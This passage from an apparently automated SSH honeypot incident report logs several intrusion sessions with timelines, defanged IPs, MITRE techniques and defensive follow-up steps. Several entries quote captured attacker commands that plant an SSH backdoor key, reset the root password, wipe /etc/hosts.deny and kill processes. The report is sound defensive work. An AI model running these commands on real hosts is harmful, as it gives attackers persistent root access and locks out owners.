| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:m0pmSEc5dyBd"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:13:58` | `cowrie.session.connect` |
| `2026-06-09 14:13:58` | `cowrie.client.version` |
| `2026-06-09 14:13:58` | `cowrie.client.kex` |
| `2026-06-09 14:13:59` | `cowrie.login.success` |
| `2026-06-09 14:14:00` | `cowrie.session.params` |
| `2026-06-09 14:14:00` | `cowrie.command.input` |
| `2026-06-09 14:14:00` | `cowrie.command.failed` |
| `2026-06-09 14:14:00` | `cowrie.log.closed` |
| `2026-06-09 14:14:02` | `cowrie.session.params` |
| `2026-06-09 14:14:02` | `cowrie.command.input` |
| `2026-06-09 14:14:05` | `cowrie.session.file_download` |
| `2026-06-09 14:14:05` | `cowrie.log.closed` |
| `2026-06-09 14:14:18` | `cowrie.session.params` |
| `2026-06-09 14:14:18` | `cowrie.command.input` |
| `2026-06-09 14:14:18` | `cowrie.log.closed` |
| `2026-06-09 14:14:18` | `cowrie.session.params` |
| `2026-06-09 14:14:18` | `cowrie.command.input` |
| `2026-06-09 14:14:18` | `cowrie.log.closed` |
| `2026-06-09 14:14:19` | `cowrie.session.params` |
| `2026-06-09 14:14:19` | `cowrie.command.input` |
| `2026-06-09 14:14:19` | `cowrie.session.file_download` |
| `2026-06-09 14:14:19` | `cowrie.log.closed` |
| `2026-06-09 14:14:19` | `cowrie.session.params` |
| `2026-06-09 14:14:19` | `cowrie.command.input` |
| `2026-06-09 14:14:19` | `cowrie.log.closed` |
| `2026-06-09 14:14:20` | `cowrie.session.params` |
| `2026-06-09 14:14:20` | `cowrie.command.input` |
| `2026-06-09 14:14:20` | `cowrie.log.closed` |
| `2026-06-09 14:14:20` | `cowrie.session.params` |
| `2026-06-09 14:14:20` | `cowrie.command.input` |
| `2026-06-09 14:14:20` | `cowrie.command.input` |
| `2026-06-09 14:14:20` | `cowrie.log.closed` |
| `2026-06-09 14:14:21` | `cowrie.session.params` |
| `2026-06-09 14:14:21` | `cowrie.command.input` |
| `2026-06-09 14:14:21` | `cowrie.log.closed` |
| `2026-06-09 14:14:21` | `cowrie.session.params` |
| `2026-06-09 14:14:21` | `cowrie.command.input` |
| `2026-06-09 14:14:21` | `cowrie.log.closed` |
| `2026-06-09 14:14:22` | `cowrie.session.params` |
| `2026-06-09 14:14:22` | `cowrie.command.input` |
| `2026-06-09 14:14:22` | `cowrie.log.closed` |
| `2026-06-09 14:14:22` | `cowrie.session.params` |
| `2026-06-09 14:14:22` | `cowrie.command.input` |
| `2026-06-09 14:14:22` | `cowrie.log.closed` |
| `2026-06-09 14:14:23` | `cowrie.session.params` |
| `2026-06-09 14:14:23` | `cowrie.command.input` |
| `2026-06-09 14:14:23` | `cowrie.log.closed` |
| `2026-06-09 14:14:23` | `cowrie.session.params` |
| `2026-06-09 14:14:23` | `cowrie.command.input` |
| `2026-06-09 14:14:23` | `cowrie.log.closed` |
| `2026-06-09 14:14:24` | `cowrie.session.params` |
| `2026-06-09 14:14:24` | `cowrie.command.input` |
| `2026-06-09 14:14:24` | `cowrie.log.closed` |
| `2026-06-09 14:14:24` | `cowrie.session.params` |
| `2026-06-09 14:14:24` | `cowrie.command.input` |
| `2026-06-09 14:14:24` | `cowrie.log.closed` |
| `2026-06-09 14:14:25` | `cowrie.session.params` |
| `2026-06-09 14:14:25` | `cowrie.command.input` |
| `2026-06-09 14:14:25` | `cowrie.log.closed` |
| `2026-06-09 14:14:25` | `cowrie.session.params` |
| `2026-06-09 14:14:25` | `cowrie.command.input` |
| `2026-06-09 14:14:25` | `cowrie.log.closed` |
| `2026-06-09 14:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.96.157[.]188` to AbuseIPDB if not already reported
- [ ] Block `119.96.157[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a68f451e4ede

| Field | Detail |
|---|---|
| **Source IP** | `119.96.157[.]188` |
| **First Seen** | 2026-06-09 14:14 |
| **Last Seen** | 2026-06-09 14:14 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:kTdAgHsoRVaD"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:14:29` | `cowrie.session.connect` |
| `2026-06-09 14:14:29` | `cowrie.client.version` |
| `2026-06-09 14:14:29` | `cowrie.client.kex` |
| `2026-06-09 14:14:31` | `cowrie.login.success` |
| `2026-06-09 14:14:31` | `cowrie.session.params` |
| `2026-06-09 14:14:31` | `cowrie.command.input` |
| `2026-06-09 14:14:31` | `cowrie.command.failed` |
| `2026-06-09 14:14:31` | `cowrie.log.closed` |
| `2026-06-09 14:14:32` | `cowrie.session.params` |
| `2026-06-09 14:14:32` | `cowrie.command.input` |
| `2026-06-09 14:14:32` | `cowrie.session.file_download` |
| `2026-06-09 14:14:32` | `cowrie.log.closed` |
| `2026-06-09 14:14:45` | `cowrie.session.params` |
| `2026-06-09 14:14:45` | `cowrie.command.input` |
| `2026-06-09 14:14:45` | `cowrie.log.closed` |
| `2026-06-09 14:14:45` | `cowrie.session.params` |
| `2026-06-09 14:14:45` | `cowrie.command.input` |
| `2026-06-09 14:14:45` | `cowrie.log.closed` |
| `2026-06-09 14:14:46` | `cowrie.session.params` |
| `2026-06-09 14:14:46` | `cowrie.command.input` |
| `2026-06-09 14:14:46` | `cowrie.session.file_download` |
| `2026-06-09 14:14:46` | `cowrie.log.closed` |
| `2026-06-09 14:14:46` | `cowrie.session.params` |
| `2026-06-09 14:14:46` | `cowrie.command.input` |
| `2026-06-09 14:14:46` | `cowrie.log.closed` |
| `2026-06-09 14:14:47` | `cowrie.session.params` |
| `2026-06-09 14:14:47` | `cowrie.command.input` |
| `2026-06-09 14:14:47` | `cowrie.log.closed` |
| `2026-06-09 14:14:47` | `cowrie.session.params` |
| `2026-06-09 14:14:47` | `cowrie.command.input` |
| `2026-06-09 14:14:47` | `cowrie.command.input` |
| `2026-06-09 14:14:47` | `cowrie.log.closed` |
| `2026-06-09 14:14:48` | `cowrie.session.params` |
| `2026-06-09 14:14:48` | `cowrie.command.input` |
| `2026-06-09 14:14:48` | `cowrie.log.closed` |
| `2026-06-09 14:14:48` | `cowrie.session.params` |
| `2026-06-09 14:14:48` | `cowrie.command.input` |
| `2026-06-09 14:14:48` | `cowrie.log.closed` |
| `2026-06-09 14:14:49` | `cowrie.session.params` |
| `2026-06-09 14:14:49` | `cowrie.command.input` |
| `2026-06-09 14:14:49` | `cowrie.log.closed` |
| `2026-06-09 14:14:49` | `cowrie.session.params` |
| `2026-06-09 14:14:49` | `cowrie.command.input` |
| `2026-06-09 14:14:49` | `cowrie.log.closed` |
| `2026-06-09 14:14:50` | `cowrie.session.params` |
| `2026-06-09 14:14:50` | `cowrie.command.input` |
| `2026-06-09 14:14:50` | `cowrie.log.closed` |
| `2026-06-09 14:14:50` | `cowrie.session.params` |
| `2026-06-09 14:14:50` | `cowrie.command.input` |
| `2026-06-09 14:14:50` | `cowrie.log.closed` |
| `2026-06-09 14:14:51` | `cowrie.session.params` |
| `2026-06-09 14:14:51` | `cowrie.command.input` |
| `2026-06-09 14:14:51` | `cowrie.log.closed` |
| `2026-06-09 14:14:51` | `cowrie.session.params` |
| `2026-06-09 14:14:51` | `cowrie.command.input` |
| `2026-06-09 14:14:51` | `cowrie.log.closed` |
| `2026-06-09 14:14:52` | `cowrie.session.params` |
| `2026-06-09 14:14:52` | `cowrie.command.input` |
| `2026-06-09 14:14:52` | `cowrie.log.closed` |
| `2026-06-09 14:14:52` | `cowrie.session.params` |
| `2026-06-09 14:14:52` | `cowrie.command.input` |
| `2026-06-09 14:14:52` | `cowrie.log.closed` |
| `2026-06-09 14:14:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.96.157[.]188` to AbuseIPDB if not already reported
- [ ] Block `119.96.157[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6d7e2180699

| Field | Detail |
|---|---|
| **Source IP** | `119.246.15[.]94` |
| **First Seen** | 2026-06-09 14:18 |
| **Last Seen** | 2026-06-09 14:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:18:54` | `cowrie.session.connect` |
| `2026-06-09 14:18:54` | `cowrie.client.version` |
| `2026-06-09 14:18:54` | `cowrie.client.kex` |
| `2026-06-09 14:18:55` | `cowrie.login.success` |
| `2026-06-09 14:18:55` | `cowrie.session.params` |
| `2026-06-09 14:18:55` | `cowrie.command.input` |
| `2026-06-09 14:18:55` | `cowrie.command.failed` |
| `2026-06-09 14:18:56` | `cowrie.log.closed` |
| `2026-06-09 14:18:56` | `cowrie.session.params` |
| `2026-06-09 14:18:56` | `cowrie.command.input` |
| `2026-06-09 14:18:56` | `cowrie.session.file_download` |
| `2026-06-09 14:18:56` | `cowrie.log.closed` |
| `2026-06-09 14:18:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.246.15[.]94` to AbuseIPDB if not already reported
- [ ] Block `119.246.15[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b657782206e

| Field | Detail |
|---|---|
| **Source IP** | `119.246.15[.]94` |
| **First Seen** | 2026-06-09 14:18 |
| **Last Seen** | 2026-06-09 14:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:18:58` | `cowrie.session.connect` |
| `2026-06-09 14:18:58` | `cowrie.client.version` |
| `2026-06-09 14:18:58` | `cowrie.client.kex` |
| `2026-06-09 14:18:59` | `cowrie.login.success` |
| `2026-06-09 14:18:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.246.15[.]94` to AbuseIPDB if not already reported
- [ ] Block `119.246.15[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47a72b756d15

| Field | Detail |
|---|---|
| **Source IP** | `119.96.157[.]188` |
| **First Seen** | 2026-06-09 14:21 |
| **Last Seen** | 2026-06-09 14:22 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:4oO2sOpvdS9o"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:21:51` | `cowrie.session.connect` |
| `2026-06-09 14:21:51` | `cowrie.client.version` |
| `2026-06-09 14:21:51` | `cowrie.client.kex` |
| `2026-06-09 14:21:52` | `cowrie.login.success` |
| `2026-06-09 14:21:53` | `cowrie.session.params` |
| `2026-06-09 14:21:53` | `cowrie.command.input` |
| `2026-06-09 14:21:53` | `cowrie.command.failed` |
| `2026-06-09 14:21:53` | `cowrie.log.closed` |
| `2026-06-09 14:21:53` | `cowrie.session.params` |
| `2026-06-09 14:21:53` | `cowrie.command.input` |
| `2026-06-09 14:21:54` | `cowrie.session.file_download` |
| `2026-06-09 14:21:54` | `cowrie.log.closed` |
| `2026-06-09 14:22:02` | `cowrie.session.params` |
| `2026-06-09 14:22:02` | `cowrie.command.input` |
| `2026-06-09 14:22:03` | `cowrie.log.closed` |
| `2026-06-09 14:22:03` | `cowrie.session.params` |
| `2026-06-09 14:22:03` | `cowrie.command.input` |
| `2026-06-09 14:22:04` | `cowrie.log.closed` |
| `2026-06-09 14:22:04` | `cowrie.session.params` |
| `2026-06-09 14:22:04` | `cowrie.command.input` |
| `2026-06-09 14:22:04` | `cowrie.session.file_download` |
| `2026-06-09 14:22:04` | `cowrie.log.closed` |
| `2026-06-09 14:22:05` | `cowrie.session.params` |
| `2026-06-09 14:22:05` | `cowrie.command.input` |
| `2026-06-09 14:22:05` | `cowrie.log.closed` |
| `2026-06-09 14:22:05` | `cowrie.session.params` |
| `2026-06-09 14:22:05` | `cowrie.command.input` |
| `2026-06-09 14:22:05` | `cowrie.log.closed` |
| `2026-06-09 14:22:06` | `cowrie.session.params` |
| `2026-06-09 14:22:06` | `cowrie.command.input` |
| `2026-06-09 14:22:06` | `cowrie.command.input` |
| `2026-06-09 14:22:06` | `cowrie.log.closed` |
| `2026-06-09 14:22:06` | `cowrie.session.params` |
| `2026-06-09 14:22:06` | `cowrie.command.input` |
| `2026-06-09 14:22:06` | `cowrie.log.closed` |
| `2026-06-09 14:22:07` | `cowrie.session.params` |
| `2026-06-09 14:22:07` | `cowrie.command.input` |
| `2026-06-09 14:22:07` | `cowrie.log.closed` |
| `2026-06-09 14:22:07` | `cowrie.session.params` |
| `2026-06-09 14:22:07` | `cowrie.command.input` |
| `2026-06-09 14:22:07` | `cowrie.log.closed` |
| `2026-06-09 14:22:08` | `cowrie.session.params` |
| `2026-06-09 14:22:08` | `cowrie.command.input` |
| `2026-06-09 14:22:08` | `cowrie.log.closed` |
| `2026-06-09 14:22:08` | `cowrie.session.params` |
| `2026-06-09 14:22:08` | `cowrie.command.input` |
| `2026-06-09 14:22:08` | `cowrie.log.closed` |
| `2026-06-09 14:22:09` | `cowrie.session.params` |
| `2026-06-09 14:22:09` | `cowrie.command.input` |
| `2026-06-09 14:22:09` | `cowrie.log.closed` |
| `2026-06-09 14:22:09` | `cowrie.session.params` |
| `2026-06-09 14:22:09` | `cowrie.command.input` |
| `2026-06-09 14:22:10` | `cowrie.log.closed` |
| `2026-06-09 14:22:10` | `cowrie.session.params` |
| `2026-06-09 14:22:10` | `cowrie.command.input` |
| `2026-06-09 14:22:10` | `cowrie.log.closed` |
| `2026-06-09 14:22:10` | `cowrie.session.params` |
| `2026-06-09 14:22:10` | `cowrie.command.input` |
| `2026-06-09 14:22:11` | `cowrie.log.closed` |
| `2026-06-09 14:22:11` | `cowrie.session.params` |
| `2026-06-09 14:22:11` | `cowrie.command.input` |
| `2026-06-09 14:22:11` | `cowrie.log.closed` |
| `2026-06-09 14:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.96.157[.]188` to AbuseIPDB if not already reported
- [ ] Block `119.96.157[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d1bc831f166

| Field | Detail |
|---|---|
| **Source IP** | `119.96.157[.]188` |
| **First Seen** | 2026-06-09 14:22 |
| **Last Seen** | 2026-06-09 14:23 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:fVxPdcY6Xirk"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:22:44` | `cowrie.session.connect` |
| `2026-06-09 14:22:44` | `cowrie.client.version` |
| `2026-06-09 14:22:44` | `cowrie.client.kex` |
| `2026-06-09 14:22:45` | `cowrie.login.success` |
| `2026-06-09 14:22:46` | `cowrie.session.params` |
| `2026-06-09 14:22:46` | `cowrie.command.input` |
| `2026-06-09 14:22:46` | `cowrie.command.failed` |
| `2026-06-09 14:22:46` | `cowrie.log.closed` |
| `2026-06-09 14:22:46` | `cowrie.session.params` |
| `2026-06-09 14:22:46` | `cowrie.command.input` |
| `2026-06-09 14:22:46` | `cowrie.session.file_download` |
| `2026-06-09 14:22:46` | `cowrie.log.closed` |
| `2026-06-09 14:23:01` | `cowrie.session.params` |
| `2026-06-09 14:23:01` | `cowrie.command.input` |
| `2026-06-09 14:23:01` | `cowrie.log.closed` |
| `2026-06-09 14:23:02` | `cowrie.session.params` |
| `2026-06-09 14:23:02` | `cowrie.command.input` |
| `2026-06-09 14:23:02` | `cowrie.log.closed` |
| `2026-06-09 14:23:02` | `cowrie.session.params` |
| `2026-06-09 14:23:02` | `cowrie.command.input` |
| `2026-06-09 14:23:02` | `cowrie.session.file_download` |
| `2026-06-09 14:23:02` | `cowrie.log.closed` |
| `2026-06-09 14:23:03` | `cowrie.session.params` |
| `2026-06-09 14:23:03` | `cowrie.command.input` |
| `2026-06-09 14:23:03` | `cowrie.log.closed` |
| `2026-06-09 14:23:03` | `cowrie.session.params` |
| `2026-06-09 14:23:03` | `cowrie.command.input` |
| `2026-06-09 14:23:03` | `cowrie.log.closed` |
| `2026-06-09 14:23:04` | `cowrie.session.params` |
| `2026-06-09 14:23:04` | `cowrie.command.input` |
| `2026-06-09 14:23:04` | `cowrie.command.input` |
| `2026-06-09 14:23:04` | `cowrie.log.closed` |
| `2026-06-09 14:23:04` | `cowrie.session.params` |
| `2026-06-09 14:23:04` | `cowrie.command.input` |
| `2026-06-09 14:23:04` | `cowrie.log.closed` |
| `2026-06-09 14:23:05` | `cowrie.session.params` |
| `2026-06-09 14:23:05` | `cowrie.command.input` |
| `2026-06-09 14:23:05` | `cowrie.log.closed` |
| `2026-06-09 14:23:05` | `cowrie.session.params` |
| `2026-06-09 14:23:05` | `cowrie.command.input` |
| `2026-06-09 14:23:05` | `cowrie.log.closed` |
| `2026-06-09 14:23:06` | `cowrie.session.params` |
| `2026-06-09 14:23:06` | `cowrie.command.input` |
| `2026-06-09 14:23:06` | `cowrie.log.closed` |
| `2026-06-09 14:23:06` | `cowrie.session.params` |
| `2026-06-09 14:23:06` | `cowrie.command.input` |
| `2026-06-09 14:23:06` | `cowrie.log.closed` |
| `2026-06-09 14:23:07` | `cowrie.session.params` |
| `2026-06-09 14:23:07` | `cowrie.command.input` |
| `2026-06-09 14:23:07` | `cowrie.log.closed` |
| `2026-06-09 14:23:07` | `cowrie.session.params` |
| `2026-06-09 14:23:07` | `cowrie.command.input` |
| `2026-06-09 14:23:07` | `cowrie.log.closed` |
| `2026-06-09 14:23:08` | `cowrie.session.params` |
| `2026-06-09 14:23:08` | `cowrie.command.input` |
| `2026-06-09 14:23:08` | `cowrie.log.closed` |
| `2026-06-09 14:23:08` | `cowrie.session.params` |
| `2026-06-09 14:23:08` | `cowrie.command.input` |
| `2026-06-09 14:23:08` | `cowrie.log.closed` |
| `2026-06-09 14:23:09` | `cowrie.session.params` |
| `2026-06-09 14:23:09` | `cowrie.command.input` |
| `2026-06-09 14:23:09` | `cowrie.log.closed` |
| `2026-06-09 14:23:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.96.157[.]188` to AbuseIPDB if not already reported
- [ ] Block `119.96.157[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c25eed8434f

| Field | Detail |
|---|---|
| **Source IP** | `103.52.114[.]250` |
| **First Seen** | 2026-06-09 14:22 |
| **Last Seen** | 2026-06-09 14:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:22:56` | `cowrie.session.connect` |
| `2026-06-09 14:22:56` | `cowrie.client.version` |
| `2026-06-09 14:22:56` | `cowrie.client.kex` |
| `2026-06-09 14:22:57` | `cowrie.login.success` |
| `2026-06-09 14:22:57` | `cowrie.session.params` |
| `2026-06-09 14:22:57` | `cowrie.command.input` |
| `2026-06-09 14:22:57` | `cowrie.command.failed` |
| `2026-06-09 14:22:58` | `cowrie.log.closed` |
| `2026-06-09 14:22:58` | `cowrie.session.params` |
| `2026-06-09 14:22:58` | `cowrie.command.input` |
| `2026-06-09 14:22:58` | `cowrie.session.file_download` |
| `2026-06-09 14:22:58` | `cowrie.log.closed` |
| `2026-06-09 14:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.52.114[.]250` to AbuseIPDB if not already reported
- [ ] Block `103.52.114[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bad21e4e126

| Field | Detail |
|---|---|
| **Source IP** | `103.52.114[.]250` |
| **First Seen** | 2026-06-09 14:23 |
| **Last Seen** | 2026-06-09 14:23 |
| **Session Duration** | 1s |
